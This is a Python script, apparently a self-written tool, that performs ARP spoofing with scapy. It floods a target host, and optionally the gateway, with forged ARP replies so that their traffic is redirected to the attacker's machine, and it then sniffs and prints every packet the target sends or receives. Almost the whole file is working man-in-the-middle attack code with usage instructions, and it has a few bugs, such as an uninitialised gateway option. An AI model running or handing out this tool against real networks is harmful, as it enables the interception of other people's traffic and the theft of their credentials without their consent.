#!/usr/bin/python

import sys, getopt
from scapy.all import Ether , ARP,conf, get_if_addr , get_if_hwaddr,srp1,sendp,sniff , IP
from time import sleep
import arpUtil
import subprocess
import threading
import time
rep = False 
options = {
        "interface" :conf.iface,
        "delay" : 0.1 , #delayed or
        "target" : "127.0.0.1",#attack target 
        "src": None , #attack source
        "router" : None , #my router
        "mac ":None , #my mac
        "ip" : None , #my ip 
        "targetMac" : None,
        "routerMac" : None,

        "attackTarget": True
    } 

def main(argv :list )->None:
    '''
    usage: arpSpoofing.py [-h] [-i IFACE] [-s SRC] [-d DELAY] [-gw] [-nt] 
            -t TARGET
    !!! - use sudo!
    Purpose: Spoof ARP tables. This attack make the target think that "src"
    is associated with the attacker MAC address. Thus, the attacker will get all
    messages from the target to "src adderss".
    setting the -gw option will cause to spoof also the gateway, to make it think
    that "target ip" is associated with attacker MAC address.
    optional arguments:
        -h, --help          show this help message and exit
        -i IFACE, --iface IFACE
                            Interface you wish to use
        -s SRC, --src SRC   The address you want for the attacker
        -d DELAY, --delay DELAY
                            Delay (in seconds) between messages
        -gw                 should GW be attacked as well
        -nt, --nottarget     do not attack the target (spoof only the router)
        -t TARGET, --target TARGET
                            IP of target
    '''
    def redoit(source):
        while(True):
            if(options["attackTarget"]):
                arpUtil.changeArpTable(options["target"], options["targetMac"], source  ,options["mac"], options["interface"] )
            if(options["attackGW"]):
                arpUtil.changeArpTable(options["router"], options["routerMac"], options["target"] , options["mac"],options["interface"] )
            time.sleep(options["delay"])
    try:
        opts, args = getopt.getopt(argv, "s:t:d:i:gw:h", [
                                    "src=","delay=","target=","iface=","gateway","help"])
    except getopt.GetoptError as e:
        print(e)
        sys.exit(-1)
    for opt, arg in opts:
        print(opt,arg)
        if opt == '-h':
            print(main.__doc__)
            sys.exit()
        elif opt in ("-i", "--iface"):
            options["interface"] = arg
        elif opt in ("-s", "--src"):
            options["src"] = arg
        elif opt in ("-d", "--delay"):
            options["delay"] = float(arg)
        elif opt in ("-gw", "--gateway"):
            options["attackGW"] = True
        elif opt in ("-nt", "--nottarget"):
            options["attackTarget"] = False
        elif opt in ("-t", "--target"):
            options["target"] = arg

 
    options["targetMac"] = arpUtil.getTargetMac(options["target"], options["interface"])
    options["router"] = next(filter(lambda x : x[3] == options["interface"] , dict(conf.route.__dict__)["routes"]))[2]
    options["routerMac"] = arpUtil.getTargetMac(options["router"], options["interface"])
    options["mac"]=get_if_hwaddr(options["interface"])
    options["ip"]= get_if_addr(options["interface"])

    print("Target info---------")
    print("IP:", options["target"])
    print("MAC: ", options["targetMac"])
    print("Attacker info---------")
    print("IP:", options["ip"])
    print("MAC: ", options["mac"])
    source = options["src"] if options["src"] else options["router"]
    print("Spoofing message to target: ", source, "is at", options["mac"])
    if options["attackGW"]:
        print("+ Spoofing message to router: ", options["target"], "is at ", options["mac"])
    print("\n\n")

    #the attack 
    tr = threading.Thread(target=redoit , args=(source,))
    tr.start()
    sniff(
        lfilter= lambda x : IP in x and (x[IP].dst == options["target"] or x[IP].src == options["target"] ) , prn = lambda x : x.show() 
        
    )
    tr.join()
if __name__ == "__main__":
    
    batcmd="sysctl net.ipv4.ip_forward"
    result = subprocess.check_output(batcmd, shell=True).decode(encoding='ascii')
    print(result)
    if "0" in result: 
        sys.stderr.write("Warning : ip forwarding is not enabled")
    main(sys.argv[1:])